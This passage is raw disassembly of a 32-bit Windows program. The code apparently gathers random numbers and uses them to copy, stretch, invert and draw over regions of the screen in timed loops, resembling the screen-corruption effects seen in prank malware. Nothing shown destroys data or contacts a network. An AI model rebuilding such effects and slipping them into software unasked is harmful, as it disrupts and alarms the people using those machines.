  40248e:	85 c0                	test   %eax,%eax
  402490:	75 08                	jne    0x40249a
  402492:	6a 01                	push   $0x1
  402494:	ff 15 94 00 41 00    	call   *0x410094
  40249a:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40249f:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4024a3:	51                   	push   %ecx
  4024a4:	6a 04                	push   $0x4
  4024a6:	50                   	push   %eax
  4024a7:	ff d7                	call   *%edi
  4024a9:	0f b6 4c 24 28       	movzbl 0x28(%esp),%ecx
  4024ae:	8b 44 24 50          	mov    0x50(%esp),%eax
  4024b2:	c1 e1 08             	shl    $0x8,%ecx
  4024b5:	0f b6 c0             	movzbl %al,%eax
  4024b8:	0b c8                	or     %eax,%ecx
  4024ba:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4024be:	c1 e1 08             	shl    $0x8,%ecx
  4024c1:	0f b6 c0             	movzbl %al,%eax
  4024c4:	0b c8                	or     %eax,%ecx
  4024c6:	51                   	push   %ecx
  4024c7:	ff 74 24 14          	push   0x14(%esp)
  4024cb:	ff 15 3c 00 41 00    	call   *0x41003c
  4024d1:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4024d6:	85 c0                	test   %eax,%eax
  4024d8:	75 21                	jne    0x4024fb
  4024da:	68 40 00 00 f0       	push   $0xf0000040
  4024df:	6a 01                	push   $0x1
  4024e1:	50                   	push   %eax
  4024e2:	50                   	push   %eax
  4024e3:	68 f8 81 41 00       	push   $0x4181f8
  4024e8:	ff d6                	call   *%esi
  4024ea:	85 c0                	test   %eax,%eax
  4024ec:	75 08                	jne    0x4024f6
  4024ee:	6a 01                	push   $0x1
  4024f0:	ff 15 94 00 41 00    	call   *0x410094
  4024f6:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4024fb:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4024ff:	51                   	push   %ecx
  402500:	6a 04                	push   $0x4
  402502:	50                   	push   %eax
  402503:	ff d7                	call   *%edi
  402505:	8b 44 24 30          	mov    0x30(%esp),%eax
  402509:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  40250e:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402512:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402517:	85 c0                	test   %eax,%eax
  402519:	75 21                	jne    0x40253c
  40251b:	68 40 00 00 f0       	push   $0xf0000040
  402520:	6a 01                	push   $0x1
  402522:	50                   	push   %eax
  402523:	50                   	push   %eax
  402524:	68 f8 81 41 00       	push   $0x4181f8
  402529:	ff d6                	call   *%esi
  40252b:	85 c0                	test   %eax,%eax
  40252d:	75 08                	jne    0x402537
  40252f:	6a 01                	push   $0x1
  402531:	ff 15 94 00 41 00    	call   *0x410094
  402537:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40253c:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402540:	51                   	push   %ecx
  402541:	6a 04                	push   $0x4
  402543:	50                   	push   %eax
  402544:	ff d7                	call   *%edi
  402546:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40254a:	99                   	cltd
  40254b:	f7 7c 24 18          	idivl  0x18(%esp)
  40254f:	8b 44 24 28          	mov    0x28(%esp),%eax
  402553:	8b 7c 24 20          	mov    0x20(%esp),%edi
  402557:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  40255c:	6a 08                	push   $0x8
  40255e:	68 74 4e 41 00       	push   $0x414e74
  402563:	52                   	push   %edx
  402564:	99                   	cltd
  402565:	f7 ff                	idiv   %edi
  402567:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  40256b:	52                   	push   %edx
  40256c:	56                   	push   %esi
  40256d:	ff 15 38 00 41 00    	call   *0x410038
  402573:	ff 74 24 14          	push   0x14(%esp)
  402577:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40257b:	50                   	push   %eax
  40257c:	57                   	push   %edi
  40257d:	6a 00                	push   $0x0
  40257f:	6a 00                	push   $0x0
  402581:	ff 74 24 30          	push   0x30(%esp)
  402585:	50                   	push   %eax
  402586:	57                   	push   %edi
  402587:	6a 00                	push   $0x0
  402589:	6a 00                	push   $0x0
  40258b:	56                   	push   %esi
  40258c:	ff 15 64 01 41 00    	call   *0x410164
  402592:	ff 74 24 1c          	push   0x1c(%esp)
  402596:	8b 35 48 00 41 00    	mov    0x410048,%esi
  40259c:	ff d6                	call   *%esi
  40259e:	ff 74 24 24          	push   0x24(%esp)
  4025a2:	ff d6                	call   *%esi
  4025a4:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  4025a8:	5f                   	pop    %edi
  4025a9:	5e                   	pop    %esi
  4025aa:	33 cc                	xor    %esp,%ecx
  4025ac:	e8 b9 1c 00 00       	call   0x40426a
  4025b1:	8b e5                	mov    %ebp,%esp
  4025b3:	5d                   	pop    %ebp
  4025b4:	c3                   	ret
  4025b5:	cc                   	int3
  4025b6:	cc                   	int3
  4025b7:	cc                   	int3
  4025b8:	cc                   	int3
  4025b9:	cc                   	int3
  4025ba:	cc                   	int3
  4025bb:	cc                   	int3
  4025bc:	cc                   	int3
  4025bd:	cc                   	int3
  4025be:	cc                   	int3
  4025bf:	cc                   	int3
  4025c0:	55                   	push   %ebp
  4025c1:	8b ec                	mov    %esp,%ebp
  4025c3:	83 e4 f0             	and    $0xfffffff0,%esp
  4025c6:	83 ec 58             	sub    $0x58,%esp
  4025c9:	a1 04 70 41 00       	mov    0x417004,%eax
  4025ce:	33 c4                	xor    %esp,%eax
  4025d0:	89 44 24 54          	mov    %eax,0x54(%esp)
  4025d4:	56                   	push   %esi
  4025d5:	8b 35 80 01 41 00    	mov    0x410180,%esi
  4025db:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4025df:	57                   	push   %edi
  4025e0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4025e3:	0f 57 c0             	xorps  %xmm0,%xmm0
  4025e6:	50                   	push   %eax
  4025e7:	68 50 42 40 00       	push   $0x404250
  4025ec:	6a 00                	push   $0x0
  4025ee:	6a 00                	push   $0x0
  4025f0:	89 7c 24 20          	mov    %edi,0x20(%esp)
  4025f4:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  4025f9:	ff d6                	call   *%esi
  4025fb:	8d 44 24 20          	lea    0x20(%esp),%eax
  4025ff:	0f 57 c0             	xorps  %xmm0,%xmm0
  402602:	50                   	push   %eax
  402603:	68 50 42 40 00       	push   $0x404250
  402608:	6a 00                	push   $0x0
  40260a:	6a 00                	push   $0x0
  40260c:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  402611:	ff d6                	call   *%esi
  402613:	8b 74 24 28          	mov    0x28(%esp),%esi
  402617:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40261b:	2b 44 24 24          	sub    0x24(%esp),%eax
  40261f:	2b 74 24 20          	sub    0x20(%esp),%esi
  402623:	57                   	push   %edi
  402624:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  402628:	89 44 24 10          	mov    %eax,0x10(%esp)
  40262c:	ff 15 1c 00 41 00    	call   *0x41001c
  402632:	ff 74 24 0c          	push   0xc(%esp)
  402636:	89 44 24 18          	mov    %eax,0x18(%esp)
  40263a:	56                   	push   %esi
  40263b:	57                   	push   %edi
  40263c:	ff 15 10 00 41 00    	call   *0x410010
  402642:	50                   	push   %eax
  402643:	ff 74 24 18          	push   0x18(%esp)
  402647:	89 44 24 24          	mov    %eax,0x24(%esp)
  40264b:	ff 15 14 00 41 00    	call   *0x410014
  402651:	68 20 00 cc 00       	push   $0xcc0020
  402656:	6a 00                	push   $0x0
  402658:	6a 00                	push   $0x0
  40265a:	57                   	push   %edi
  40265b:	ff 74 24 1c          	push   0x1c(%esp)
  40265f:	56                   	push   %esi
  402660:	6a 00                	push   $0x0
  402662:	6a 00                	push   $0x0
  402664:	ff 74 24 34          	push   0x34(%esp)
  402668:	ff 15 0c 00 41 00    	call   *0x41000c
  40266e:	6a 02                	push   $0x2
  402670:	57                   	push   %edi
  402671:	ff 15 24 00 41 00    	call   *0x410024
  402677:	0f 28 05 00 4f 41 00 	movaps 0x414f00,%xmm0
  40267e:	8d 44 24 44          	lea    0x44(%esp),%eax
  402682:	50                   	push   %eax
  402683:	57                   	push   %edi
  402684:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%esp)
  40268b:	00 
  40268c:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  402693:	00 
  402694:	0f 11 44 24 4c       	movups %xmm0,0x4c(%esp)
  402699:	ff 15 50 00 41 00    	call   *0x410050
  40269f:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4026a4:	8b 35 04 00 41 00    	mov    0x410004,%esi
  4026aa:	c7 44 24 08 00 00 80 	movl   $0x800000,0x8(%esp)
  4026b1:	00 
  4026b2:	85 c0                	test   %eax,%eax
  4026b4:	75 23                	jne    0x4026d9
  4026b6:	68 40 00 00 f0       	push   $0xf0000040
  4026bb:	6a 01                	push   $0x1
  4026bd:	6a 00                	push   $0x0
  4026bf:	6a 00                	push   $0x0
  4026c1:	68 f8 81 41 00       	push   $0x4181f8
  4026c6:	ff d6                	call   *%esi
  4026c8:	85 c0                	test   %eax,%eax
  4026ca:	75 08                	jne    0x4026d4
  4026cc:	6a 01                	push   $0x1
  4026ce:	ff 15 94 00 41 00    	call   *0x410094
  4026d4:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4026d9:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  4026df:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4026e3:	51                   	push   %ecx
  4026e4:	6a 04                	push   $0x4
  4026e6:	50                   	push   %eax
  4026e7:	ff d7                	call   *%edi
  4026e9:	8b 44 24 30          	mov    0x30(%esp),%eax
  4026ed:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  4026f2:	89 44 24 38          	mov    %eax,0x38(%esp)
  4026f6:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4026fb:	85 c0                	test   %eax,%eax
  4026fd:	75 21                	jne    0x402720
  4026ff:	68 40 00 00 f0       	push   $0xf0000040
  402704:	6a 01                	push   $0x1
  402706:	50                   	push   %eax
  402707:	50                   	push   %eax
  402708:	68 f8 81 41 00       	push   $0x4181f8
  40270d:	ff d6                	call   *%esi
  40270f:	85 c0                	test   %eax,%eax
  402711:	75 08                	jne    0x40271b
  402713:	6a 01                	push   $0x1
  402715:	ff 15 94 00 41 00    	call   *0x410094
  40271b:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402720:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  402724:	51                   	push   %ecx
  402725:	6a 04                	push   $0x4
  402727:	50                   	push   %eax
  402728:	ff d7                	call   *%edi
  40272a:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40272e:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402733:	89 44 24 34          	mov    %eax,0x34(%esp)
  402737:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40273c:	85 c0                	test   %eax,%eax
  40273e:	75 21                	jne    0x402761
  402740:	68 40 00 00 f0       	push   $0xf0000040
  402745:	6a 01                	push   $0x1
  402747:	50                   	push   %eax
  402748:	50                   	push   %eax
  402749:	68 f8 81 41 00       	push   $0x4181f8
  40274e:	ff d6                	call   *%esi
  402750:	85 c0                	test   %eax,%eax
  402752:	75 08                	jne    0x40275c
  402754:	6a 01                	push   $0x1
  402756:	ff 15 94 00 41 00    	call   *0x410094
  40275c:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402761:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  402765:	51                   	push   %ecx
  402766:	6a 04                	push   $0x4
  402768:	50                   	push   %eax
  402769:	ff d7                	call   *%edi
  40276b:	0f b6 4c 24 40       	movzbl 0x40(%esp),%ecx
  402770:	8b 44 24 34          	mov    0x34(%esp),%eax
  402774:	c1 e1 08             	shl    $0x8,%ecx
  402777:	0f b6 c0             	movzbl %al,%eax
  40277a:	0b c8                	or     %eax,%ecx
  40277c:	8b 44 24 38          	mov    0x38(%esp),%eax
  402780:	c1 e1 08             	shl    $0x8,%ecx
  402783:	0f b6 c0             	movzbl %al,%eax
  402786:	0b c8                	or     %eax,%ecx
  402788:	51                   	push   %ecx
  402789:	ff 74 24 14          	push   0x14(%esp)
  40278d:	ff 15 40 00 41 00    	call   *0x410040
  402793:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402798:	85 c0                	test   %eax,%eax
  40279a:	75 21                	jne    0x4027bd
  40279c:	68 40 00 00 f0       	push   $0xf0000040
  4027a1:	6a 01                	push   $0x1
  4027a3:	50                   	push   %eax
  4027a4:	50                   	push   %eax
  4027a5:	68 f8 81 41 00       	push   $0x4181f8
  4027aa:	ff d6                	call   *%esi
  4027ac:	85 c0                	test   %eax,%eax
  4027ae:	75 08                	jne    0x4027b8
  4027b0:	6a 01                	push   $0x1
  4027b2:	ff 15 94 00 41 00    	call   *0x410094
  4027b8:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4027bd:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  4027c1:	51                   	push   %ecx
  4027c2:	6a 04                	push   $0x4
  4027c4:	50                   	push   %eax
  4027c5:	ff d7                	call   *%edi
  4027c7:	8b 44 24 38          	mov    0x38(%esp),%eax
  4027cb:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  4027d0:	89 44 24 30          	mov    %eax,0x30(%esp)
  4027d4:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4027d9:	85 c0                	test   %eax,%eax
  4027db:	75 21                	jne    0x4027fe
  4027dd:	68 40 00 00 f0       	push   $0xf0000040
  4027e2:	6a 01                	push   $0x1
  4027e4:	50                   	push   %eax
  4027e5:	50                   	push   %eax
  4027e6:	68 f8 81 41 00       	push   $0x4181f8
  4027eb:	ff d6                	call   *%esi
  4027ed:	85 c0                	test   %eax,%eax
  4027ef:	75 08                	jne    0x4027f9
  4027f1:	6a 01                	push   $0x1
  4027f3:	ff 15 94 00 41 00    	call   *0x410094
  4027f9:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4027fe:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402802:	51                   	push   %ecx
  402803:	6a 04                	push   $0x4
  402805:	50                   	push   %eax
  402806:	ff d7                	call   *%edi
  402808:	8b 44 24 34          	mov    0x34(%esp),%eax
  40280c:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402811:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  402815:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40281a:	85 c0                	test   %eax,%eax
  40281c:	75 21                	jne    0x40283f
  40281e:	68 40 00 00 f0       	push   $0xf0000040
  402823:	6a 01                	push   $0x1
  402825:	50                   	push   %eax
  402826:	50                   	push   %eax
  402827:	68 f8 81 41 00       	push   $0x4181f8
  40282c:	ff d6                	call   *%esi
  40282e:	85 c0                	test   %eax,%eax
  402830:	75 08                	jne    0x40283a
  402832:	6a 01                	push   $0x1
  402834:	ff 15 94 00 41 00    	call   *0x410094
  40283a:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  40283f:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  402843:	51                   	push   %ecx
  402844:	6a 04                	push   $0x4
  402846:	50                   	push   %eax
  402847:	ff d7                	call   *%edi
  402849:	0f b6 4c 24 40       	movzbl 0x40(%esp),%ecx
  40284e:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402852:	c1 e1 08             	shl    $0x8,%ecx
  402855:	0f b6 c0             	movzbl %al,%eax
  402858:	0b c8                	or     %eax,%ecx
  40285a:	8b 44 24 30          	mov    0x30(%esp),%eax
  40285e:	c1 e1 08             	shl    $0x8,%ecx
  402861:	0f b6 c0             	movzbl %al,%eax
  402864:	0b c8                	or     %eax,%ecx
  402866:	51                   	push   %ecx
  402867:	ff 74 24 14          	push   0x14(%esp)
  40286b:	ff 15 3c 00 41 00    	call   *0x41003c
  402871:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  402878:	00 
  402879:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402880:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402885:	85 c0                	test   %eax,%eax
  402887:	75 1d                	jne    0x4028a6
  402889:	68 40 00 00 f0       	push   $0xf0000040
  40288e:	6a 01                	push   $0x1
  402890:	50                   	push   %eax
  402891:	50                   	push   %eax
  402892:	68 f8 81 41 00       	push   $0x4181f8
  402897:	ff d6                	call   *%esi
  402899:	85 c0                	test   %eax,%eax
  40289b:	0f 84 2b fe ff ff    	je     0x4026cc
  4028a1:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4028a6:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  4028aa:	51                   	push   %ecx
  4028ab:	6a 04                	push   $0x4
  4028ad:	50                   	push   %eax
  4028ae:	ff d7                	call   *%edi
  4028b0:	8b 7c 24 38          	mov    0x38(%esp),%edi
  4028b4:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4028b9:	81 e7 ff ff ff 7f    	and    $0x7fffffff,%edi
  4028bf:	85 c0                	test   %eax,%eax
  4028c1:	75 1d                	jne    0x4028e0
  4028c3:	68 40 00 00 f0       	push   $0xf0000040
  4028c8:	6a 01                	push   $0x1
  4028ca:	50                   	push   %eax
  4028cb:	50                   	push   %eax
  4028cc:	68 f8 81 41 00       	push   $0x4181f8
  4028d1:	ff d6                	call   *%esi
  4028d3:	85 c0                	test   %eax,%eax
  4028d5:	0f 84 f1 fd ff ff    	je     0x4026cc
  4028db:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4028e0:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  4028e4:	51                   	push   %ecx
  4028e5:	6a 04                	push   $0x4
  4028e7:	50                   	push   %eax
  4028e8:	ff 15 00 00 41 00    	call   *0x410000
  4028ee:	8b c7                	mov    %edi,%eax
  4028f0:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4028f4:	99                   	cltd
  4028f5:	f7 7c 24 0c          	idivl  0xc(%esp)
  4028f9:	8b 44 24 34          	mov    0x34(%esp),%eax
  4028fd:	6a 0b                	push   $0xb
  4028ff:	68 88 4e 41 00       	push   $0x414e88
  402904:	52                   	push   %edx
  402905:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  40290a:	99                   	cltd
  40290b:	f7 7c 24 24          	idivl  0x24(%esp)
  40290f:	52                   	push   %edx
  402910:	57                   	push   %edi
  402911:	ff 15 38 00 41 00    	call   *0x410038
  402917:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40291b:	41                   	inc    %ecx
  40291c:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402920:	83 f9 05             	cmp    $0x5,%ecx
  402923:	7d 0b                	jge    0x402930
  402925:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  40292b:	e9 50 ff ff ff       	jmp    0x402880
  402930:	ff 74 24 08          	push   0x8(%esp)
  402934:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402938:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40293c:	8b 74 24 18          	mov    0x18(%esp),%esi
  402940:	51                   	push   %ecx
  402941:	50                   	push   %eax
  402942:	6a 00                	push   $0x0
  402944:	6a 00                	push   $0x0
  402946:	56                   	push   %esi
  402947:	51                   	push   %ecx
  402948:	50                   	push   %eax
  402949:	6a 00                	push   $0x0
  40294b:	6a 00                	push   $0x0
  40294d:	57                   	push   %edi
  40294e:	ff 15 64 01 41 00    	call   *0x410164
  402954:	56                   	push   %esi
  402955:	8b 35 48 00 41 00    	mov    0x410048,%esi
  40295b:	ff d6                	call   *%esi
  40295d:	ff 74 24 1c          	push   0x1c(%esp)
  402961:	ff d6                	call   *%esi
  402963:	6a 32                	push   $0x32
  402965:	ff 15 a8 00 41 00    	call   *0x4100a8
  40296b:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  40296f:	5f                   	pop    %edi
  402970:	5e                   	pop    %esi
  402971:	33 cc                	xor    %esp,%ecx
  402973:	e8 f2 18 00 00       	call   0x40426a
  402978:	8b e5                	mov    %ebp,%esp
  40297a:	5d                   	pop    %ebp
  40297b:	c3                   	ret
  40297c:	cc                   	int3
  40297d:	cc                   	int3
  40297e:	cc                   	int3
  40297f:	cc                   	int3
  402980:	55                   	push   %ebp
  402981:	8b ec                	mov    %esp,%ebp
  402983:	83 e4 f0             	and    $0xfffffff0,%esp
  402986:	83 ec 68             	sub    $0x68,%esp
  402989:	a1 04 70 41 00       	mov    0x417004,%eax
  40298e:	33 c4                	xor    %esp,%eax
  402990:	89 44 24 64          	mov    %eax,0x64(%esp)
  402994:	56                   	push   %esi
  402995:	8b 35 80 01 41 00    	mov    0x410180,%esi
  40299b:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40299f:	57                   	push   %edi
  4029a0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4029a3:	0f 57 c0             	xorps  %xmm0,%xmm0
  4029a6:	50                   	push   %eax
  4029a7:	68 50 42 40 00       	push   $0x404250
  4029ac:	6a 00                	push   $0x0
  4029ae:	6a 00                	push   $0x0
  4029b0:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4029b4:	0f 29 44 24 40       	movaps %xmm0,0x40(%esp)
  4029b9:	ff d6                	call   *%esi
  4029bb:	8d 44 24 20          	lea    0x20(%esp),%eax
  4029bf:	0f 57 c0             	xorps  %xmm0,%xmm0
  4029c2:	50                   	push   %eax
  4029c3:	68 50 42 40 00       	push   $0x404250
  4029c8:	6a 00                	push   $0x0
  4029ca:	6a 00                	push   $0x0
  4029cc:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  4029d1:	ff d6                	call   *%esi
  4029d3:	8b 44 24 28          	mov    0x28(%esp),%eax
  4029d7:	2b 44 24 20          	sub    0x20(%esp),%eax
  4029db:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4029df:	2b 4c 24 24          	sub    0x24(%esp),%ecx
  4029e3:	6a 00                	push   $0x0
  4029e5:	6a 00                	push   $0x0
  4029e7:	6a 00                	push   $0x0
  4029e9:	51                   	push   %ecx
  4029ea:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4029ee:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  4029f2:	83 c0 19             	add    $0x19,%eax
  4029f5:	50                   	push   %eax
  4029f6:	ff 74 24 48          	push   0x48(%esp)
  4029fa:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4029fe:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402a02:	ff 74 24 48          	push   0x48(%esp)
  402a06:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%esp)
  402a0d:	00 
  402a0e:	57                   	push   %edi
  402a0f:	50                   	push   %eax
  402a10:	57                   	push   %edi
  402a11:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%esp)
  402a18:	00 00 00 00 
  402a1c:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%esp)
  402a23:	00 00 00 00 
  402a27:	c7 84 24 8c 00 00 00 	movl   $0x19,0x8c(%esp)
  402a2e:	19 00 00 00 
  402a32:	89 8c 24 90 00 00 00 	mov    %ecx,0x90(%esp)
  402a39:	ff 15 2c 00 41 00    	call   *0x41002c
  402a3f:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402a44:	8b 3d 04 00 41 00    	mov    0x410004,%edi
  402a4a:	85 c0                	test   %eax,%eax
  402a4c:	75 23                	jne    0x402a71
  402a4e:	68 40 00 00 f0       	push   $0xf0000040
  402a53:	6a 01                	push   $0x1
  402a55:	6a 00                	push   $0x0
  402a57:	6a 00                	push   $0x0
  402a59:	68 f8 81 41 00       	push   $0x4181f8
  402a5e:	ff d7                	call   *%edi
  402a60:	85 c0                	test   %eax,%eax
  402a62:	75 08                	jne    0x402a6c
  402a64:	6a 01                	push   $0x1
  402a66:	ff 15 94 00 41 00    	call   *0x410094
  402a6c:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402a71:	8b 35 00 00 41 00    	mov    0x410000,%esi
  402a77:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402a7b:	51                   	push   %ecx
  402a7c:	6a 04                	push   $0x4
  402a7e:	50                   	push   %eax
  402a7f:	ff d6                	call   *%esi
  402a81:	8b 44 24 48          	mov    0x48(%esp),%eax
  402a85:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402a8a:	89 44 24 10          	mov    %eax,0x10(%esp)
  402a8e:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402a93:	85 c0                	test   %eax,%eax
  402a95:	75 21                	jne    0x402ab8
  402a97:	68 40 00 00 f0       	push   $0xf0000040
  402a9c:	6a 01                	push   $0x1
  402a9e:	50                   	push   %eax
  402a9f:	50                   	push   %eax
  402aa0:	68 f8 81 41 00       	push   $0x4181f8
  402aa5:	ff d7                	call   *%edi
  402aa7:	85 c0                	test   %eax,%eax
  402aa9:	75 08                	jne    0x402ab3
  402aab:	6a 01                	push   $0x1
  402aad:	ff 15 94 00 41 00    	call   *0x410094
  402ab3:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402ab8:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402abc:	51                   	push   %ecx
  402abd:	6a 04                	push   $0x4
  402abf:	50                   	push   %eax
  402ac0:	ff d6                	call   *%esi
  402ac2:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  402ac6:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402acb:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402acf:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402ad4:	85 c0                	test   %eax,%eax
  402ad6:	75 21                	jne    0x402af9
  402ad8:	68 40 00 00 f0       	push   $0xf0000040
  402add:	6a 01                	push   $0x1
  402adf:	50                   	push   %eax
  402ae0:	50                   	push   %eax
  402ae1:	68 f8 81 41 00       	push   $0x4181f8
  402ae6:	ff d7                	call   *%edi
  402ae8:	85 c0                	test   %eax,%eax
  402aea:	75 08                	jne    0x402af4
  402aec:	6a 01                	push   $0x1
  402aee:	ff 15 94 00 41 00    	call   *0x410094
  402af4:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402af9:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  402afd:	51                   	push   %ecx
  402afe:	6a 04                	push   $0x4
  402b00:	50                   	push   %eax
  402b01:	ff d6                	call   *%esi
  402b03:	0f b6 4c 24 50       	movzbl 0x50(%esp),%ecx
  402b08:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402b0c:	c1 e1 08             	shl    $0x8,%ecx
  402b0f:	0f b6 c0             	movzbl %al,%eax
  402b12:	0b c8                	or     %eax,%ecx
  402b14:	8b 44 24 10          	mov    0x10(%esp),%eax
  402b18:	c1 e1 08             	shl    $0x8,%ecx
  402b1b:	0f b6 c0             	movzbl %al,%eax
  402b1e:	0b c8                	or     %eax,%ecx
  402b20:	51                   	push   %ecx
  402b21:	ff 15 4c 00 41 00    	call   *0x41004c
  402b27:	8b 74 24 14          	mov    0x14(%esp),%esi
  402b2b:	50                   	push   %eax
  402b2c:	56                   	push   %esi
  402b2d:	ff 15 14 00 41 00    	call   *0x410014
  402b33:	68 49 00 5a 00       	push   $0x5a0049
  402b38:	ff 74 24 1c          	push   0x1c(%esp)
  402b3c:	ff 74 24 24          	push   0x24(%esp)
  402b40:	ff 74 24 40          	push   0x40(%esp)
  402b44:	ff 74 24 40          	push   0x40(%esp)
  402b48:	56                   	push   %esi
  402b49:	ff 15 20 00 41 00    	call   *0x410020
  402b4f:	6a 32                	push   $0x32
  402b51:	ff 15 a8 00 41 00    	call   *0x4100a8
  402b57:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  402b5b:	5f                   	pop    %edi
  402b5c:	5e                   	pop    %esi
  402b5d:	33 cc                	xor    %esp,%ecx
  402b5f:	e8 06 17 00 00       	call   0x40426a
  402b64:	8b e5                	mov    %ebp,%esp
  402b66:	5d                   	pop    %ebp
  402b67:	c3                   	ret
  402b68:	cc                   	int3
  402b69:	cc                   	int3
  402b6a:	cc                   	int3
  402b6b:	cc                   	int3
  402b6c:	cc                   	int3
  402b6d:	cc                   	int3
  402b6e:	cc                   	int3
  402b6f:	cc                   	int3
  402b70:	55                   	push   %ebp
  402b71:	8b ec                	mov    %esp,%ebp
  402b73:	83 e4 f0             	and    $0xfffffff0,%esp
  402b76:	83 ec 48             	sub    $0x48,%esp
  402b79:	a1 04 70 41 00       	mov    0x417004,%eax
  402b7e:	33 c4                	xor    %esp,%eax
  402b80:	89 44 24 44          	mov    %eax,0x44(%esp)
  402b84:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b87:	0f 57 c0             	xorps  %xmm0,%xmm0
  402b8a:	56                   	push   %esi
  402b8b:	8b 35 80 01 41 00    	mov    0x410180,%esi
  402b91:	57                   	push   %edi
  402b92:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402b96:	8d 44 24 20          	lea    0x20(%esp),%eax
  402b9a:	50                   	push   %eax
  402b9b:	68 50 42 40 00       	push   $0x404250
  402ba0:	6a 00                	push   $0x0
  402ba2:	6a 00                	push   $0x0
  402ba4:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  402ba9:	ff d6                	call   *%esi
  402bab:	8d 44 24 20          	lea    0x20(%esp),%eax
  402baf:	0f 57 c0             	xorps  %xmm0,%xmm0
  402bb2:	50                   	push   %eax
  402bb3:	68 50 42 40 00       	push   $0x404250
  402bb8:	6a 00                	push   $0x0
  402bba:	6a 00                	push   $0x0
  402bbc:	0f 29 44 24 30       	movaps %xmm0,0x30(%esp)
  402bc1:	ff d6                	call   *%esi
  402bc3:	8b 44 24 28          	mov    0x28(%esp),%eax
